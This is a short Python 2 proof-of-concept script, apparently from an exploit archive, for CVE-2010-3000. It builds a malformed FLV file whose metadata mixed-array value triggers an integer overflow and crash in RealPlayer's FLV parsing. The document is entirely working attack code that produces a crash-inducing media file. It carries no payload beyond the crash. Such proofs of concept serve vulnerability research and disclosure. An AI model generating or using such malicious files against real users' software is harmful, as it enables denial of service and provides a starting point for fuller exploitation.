# POC for CVE-2010-3000
# http://www.exploit-db.com/moaub-13-realplayer-flv-parsing-multiple-integer-overflow/
# http://www.exploit-db.com/sploits/moaub-13-exploit.zip
 
import sys
 
def main():
 
    flvHeader = '\x46\x4C\x56\x01\x05\x00\x00\x00\x09'
    flvBody1 = '\x00\x00\x00\x00\x12\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00\x02\x00\x0A\x6F\x6E\x4D\x65\x74\x61\x44\x61\x74\x61\x08'
    HX_FLV_META_AMF_TYPE_MIXEDARRAY_Value = "\x07\x50\x75\x08"   #  if value >= 0x7507508   --> crash
    flvBody2  = "\x00\x00\x09\x00\x00\x00\x20"
     
    flv = open('poc.flv', 'wb+')
    flv.write(flvHeader)
    flv.write(flvBody1)
    flv.write(HX_FLV_META_AMF_TYPE_MIXEDARRAY_Value)
    flv.write(flvBody2)
     
    flv.close()
    print '[-] FLV file generated'
     
if __name__ == '__main__':
    main()
